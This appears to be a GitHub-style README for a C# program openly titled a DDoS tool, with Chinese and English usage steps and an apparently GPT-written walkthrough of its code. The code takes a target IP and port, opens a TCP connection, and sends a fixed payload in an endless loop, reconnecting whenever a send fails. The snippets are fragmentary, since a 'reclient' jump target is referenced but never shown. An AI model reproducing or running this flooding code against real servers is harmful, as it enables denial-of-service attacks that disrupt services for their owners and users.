# DDOS-by-CS(A DDoS programing by CSharp)

# 简体中文
## 如何使用?
输入服务器IP(域名)  
输入服务器端口  
然后<kbd>回车</kbd>

# English
## How to use?
Input IP or domain name of server.  
Input the port of server.  
Then press <kbd>Enter</kbd>.
<hr>

# GPT的解析：
# 代码功能解析  
这段代码是一个简单的 C# 程序，用于与服务器建立 TCP 连接，并发送数据包到服务器。  
## 导入命名空间：  
```CSharp
using System;
using System.Net;
using System.Net.Sockets;
```
这些命名空间包含了程序中需要用到的类和方法。  
## 声明 Program 类：  
```CSharp
class Program {
    // 程序的入口方法
    public static void Main() {
        // ...
    }
}
```
Main 方法是程序的入口点。  
## 获取服务器 IP 地址和端口号：  
```CSharp
string serverIP;
int serverPort;
Console.Write("服务器    |  Server: ");
serverIP = Console.ReadLine();
while (true) {
    Console.Write("端口      |  Port  : ");
    if (int.TryParse(Console.ReadLine(), out serverPort)) {
        break;
    } else {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("端口不正确|  Invalid input");
        Console.ResetColor();
    }
}
```
这段代码会提示用户输入服务器的 IP 地址和端口号，并进行验证。  
## 连接服务器：  
```CSharp
TcpClient client = new TcpClient();
try {
    client.Connect(serverIP, serverPort);
    Console.WriteLine("服务器连接成功  |  Connect success.");
} catch (Exception e) {
    Console.ForegroundColor = ConsoleColor.Red;
    Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
    Console.ResetColor();
}
```
这段代码会创建一个 TcpClient 实例，并使用 Connect 方法连接到指定的服务器。如果连接成功，会输出连接成功的消息，否则会输出连接失败的消息。  
## 获取网络流：  
```CSharp
NetworkStream stream = client.GetStream();
```
这段代码会从 TcpClient 实例获取网络流，用于后续的数据传输。  
## 发送数据包：  
```CSharp
byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
int count = 0;
while (true) {
    count++;
    try {
        stream.Write(buffer, 0, buffer.Length);
        Console.Write("发了第" + count + "次包");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("成功");
        Console.ResetColor();
    } catch (Exception e) {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("在发送第" + count + "时发送问题" + e.Message);
        Console.ResetColor();
        goto reclient;
    }
}
```
这段代码会循环发送数据包到服务器。每次发送都会将计数器加一，并输出发送成功的消息。如果发送过程中出现异常，会输出发送失败的消息，并通过 goto 语句跳转到 reclient 标签处重新连接服务器。  
总体而言，这段代码的作用是建立 TCP 连接到指定的服务器，并循环发送数据包到服务器。在发送过程中，会输出相应的提示信息。
